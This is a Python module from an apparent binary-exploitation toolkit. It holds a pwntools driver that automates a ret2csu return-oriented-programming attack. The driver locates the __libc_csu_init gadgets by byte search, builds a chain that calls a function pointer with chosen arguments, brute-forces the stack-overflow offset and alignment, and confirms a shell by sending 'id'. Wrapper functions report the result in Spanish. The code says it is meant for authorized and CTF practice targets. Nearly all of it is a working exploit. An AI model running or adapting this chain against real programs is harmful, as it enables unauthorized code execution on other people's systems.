"""ret2csu verified by execution: control rdi/rsi/rdx and make a call with the universal gadgets.

The two `__libc_csu_init`-style gadgets let you set the first three argument registers and perform an
indirect call WITHOUT any `pop rsi`/`pop rdx` gadget -- the classic way to call a function with
controlled arguments in a gadget-poor x86-64 binary:

    gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    gadget2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]

Set rbx=0, rbp=1 (so the csu loop runs once and stops), r12=&(pointer to the target function),
r13=arg1 (edi, 32-bit), r14=arg2 (rsi), r15=arg3 (rdx); gadget2 then calls target(arg1,arg2,arg3).
binoracle builds this and VERIFIES it by execution -- a real shell in the sandbox. The gadgets are
located by byte-pattern search (independent of symbol names). For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (ret2csu driver is x86-64)"); sys.exit(1)

def find(seq):
    return next(elf.search(seq), None)

# gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
G1 = find(bytes([0x5b,0x5d,0x41,0x5c,0x41,0x5d,0x41,0x5e,0x41,0x5f,0xc3]))
# gadget2 core: mov rdx,r15; mov rsi,r14; mov edi,r13d  (4c89fa 4c89f6 4489ef)
G2 = find(bytes([0x4c,0x89,0xfa,0x4c,0x89,0xf6,0x44,0x89,0xef]))
RET = find(bytes([0xc3]))        # a bare `ret` for 16-byte stack re-alignment (MOVAPS in glibc)
if G1 is None or G2 is None or RET is None:
    print("NOT_APPLICABLE (no __libc_csu_init-style gadgets found)"); sys.exit(1)

# a pointer in writable/known memory holding the address of a callable target. Prefer a symbol
# named 'fnptr' (practice targets), else any .data/.got qword that points into executable code.
target_ptr = None
win = elf.symbols.get("win")
if "fnptr" in elf.symbols:
    target_ptr = elf.symbols["fnptr"]
if target_ptr is None:
    print("NOT_APPLICABLE (no known function pointer to call via [r12+rbx*8])"); sys.exit(1)

A1, A2, A3 = 0x1337, 0xdead, 0xbeef          # sentinels the practice win() checks
MARK = b"BINORACLE_CSU_PWNED"

def chain(align):
    c  = p64(RET) * align   # 0 or 1 extra `ret` to flip 16-byte alignment for glibc's MOVAPS
    c += p64(G1)
    c += p64(0)          # rbx = 0  (index: call [r12 + 0])
    c += p64(1)          # rbp = 1  (csu loop: after inc rbx==rbp -> stop; harmless if no loop)
    c += p64(target_ptr) # r12 = &fnptr
    c += p64(A1)         # r13 -> edi (arg1)
    c += p64(A2)         # r14 -> rsi (arg2)
    c += p64(A3)         # r15 -> rdx (arg3)
    c += p64(G2)         # gadget2: set rdx/rsi/edi, call [r12+rbx*8] = fnptr = win
    # after win() returns, gadget2's own `ret` (or the csu epilogue) consumes more slots; pad with
    # the gadget1 address again as a benign landing so a trailing `ret` doesn't crash before the shell
    c += p64(G1) + p64(0) * 6
    return c

# the needed alignment depends on the overflow offset's parity, so sweep both ret-slides
for off in [72, 64, 88, 56, 96, 80, 104, 120, 40, 48]:
    for align in (0, 1):
        io = None
        try:
            io = process([name])
            try: io.recvrepeat(0.2)
            except Exception: pass
            io.send(b"A" * off + chain(align)); time.sleep(0.3)
            io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
            out = b""
            try: out = io.recvrepeat(1.2)
            except Exception: pass
            io.close()
            if MARK in out or b"uid=" in out:
                print("VERIFIED off=%d align=%d g1=%#x g2=%#x fnptr=%#x" % (off, align, G1, G2, target_ptr))
                sys.exit(0)
        except Exception:
            try:
                if io: io.close()
            except Exception: pass
print("NOT_VERIFIED")
sys.exit(1)
'''


def autocsu(binary: str) -> dict:
    """ret2csu execve/call-win verificado por ejecucion. Necesita los 2 gadgets universales y un
    puntero a funcion conocido (`fnptr`). Docker o sandbox nativo; degrada limpio."""
    res = run_driver(binary, _DRIVER, ".binoracle_csu.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"ret2csu (__libc_csu_init): args controlados + call, shell verificada ({eng})"
                   if res.get("verified")
                   else f"ret2csu: no verificado ({eng}) (sin gadgets csu / puntero de funcion / timing)")
    return res


def render_csu(r: dict) -> str:
    out = ["## Auto ret2csu (gadgets universales, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
